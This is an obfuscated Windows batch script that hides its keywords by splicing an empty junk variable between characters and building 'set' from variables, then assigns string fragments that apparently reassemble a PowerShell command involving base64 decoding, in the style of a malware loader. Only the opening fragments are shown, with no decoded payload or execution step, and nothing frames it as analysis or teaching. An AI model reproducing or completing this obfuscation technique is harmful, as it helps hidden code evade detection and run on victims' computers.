@echo off
%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%s%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%e%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%t%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%l%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%o%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%c%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%a%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%l%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX% %YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%e%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%n%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%a%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%b%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%l%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%e%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%d%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%e%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%l%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%a%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%y%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%e%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%d%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%e%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%x%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%p%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%a%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%n%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%s%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%i%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%o%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%n%YOiwaWeKDTxIacSgFPdEWRlTAXWCeQzLwqcPDhCFlfrgGfHxLX%
set "GDxPaJyDAvxdYUjWZiffKMwOLDQojUAKrNXVrDbWmPpXfKZfKF=s"
set "slTwOThJdwSjtFUNMkWoEwhiSVwzIaDLDDCpQUZdNHAEecwKcs=t"
set "AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB=!GDxPaJyDAvxdYUjWZiffKMwOLDQojUAKrNXVrDbWmPpXfKZfKF!e!slTwOThJdwSjtFUNMkWoEwhiSVwzIaDLDDCpQUZdNHAEecwKcs!"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "ITwBzhWxzh=ion "
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "lcvhIQZelw=romB"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "nHWlsLcViI=yStr"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "FmvlCleaUQ=n $a"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "UfyJOBWLKy=($b)"
!AiajBpaLPgLgwamKmMaYxtlPMSDICerHDIJMiwDoLCJrCisOpB! "KxFHMmcsGK=/Cli"
